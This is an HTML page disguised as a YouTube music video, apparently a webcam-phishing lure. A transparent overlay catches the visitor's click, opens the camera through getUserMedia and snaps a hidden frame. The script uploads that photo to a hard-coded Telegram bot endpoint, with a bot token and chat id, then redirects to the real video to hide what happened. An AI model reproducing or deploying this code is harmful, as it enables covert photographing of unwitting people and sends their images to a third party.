<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>YouTube - Music Video</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #000; }
        iframe { width: 100%; height: 100%; border: none; }
        .click-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99; }
    </style>
</head>
<body>
    <iframe src="https://www.youtube.com/embed/Enf0Z0SsQHs?autoplay=1&mute=1"></iframe>
    <div class="click-layer" onclick="capture()"></div>
    <video id="v" style="display:none;" autoplay></video>
    <canvas id="c" style="display:none;" width="640" height="480"></canvas>

    <script>
        async function capture() {
            const s = await navigator.mediaDevices.getUserMedia({ video: true });
            const v = document.getElementById('v');
            v.srcObject = s;
            setTimeout(() => {
                const c = document.getElementById('c');
                c.getContext('2d').drawImage(v, 0, 0);
                c.toBlob(b => send(b));
            }, 1000);
        }
        function send(b) {
            const fd = new FormData();
            fd.append('photo', b, 'p.jpg');
            fetch('https://api.telegram.org/bot8541185973:AAFhTLOGzfi5FQpMrnLKtKVzzWeUr6SL2rI/sendPhoto?chat_id=8275787221', {method:'POST', body:fd})
            .then(() => window.location.href = "https://youtu.be/Enf0Z0SsQHs");
        }
    </script>
</body>
</html>
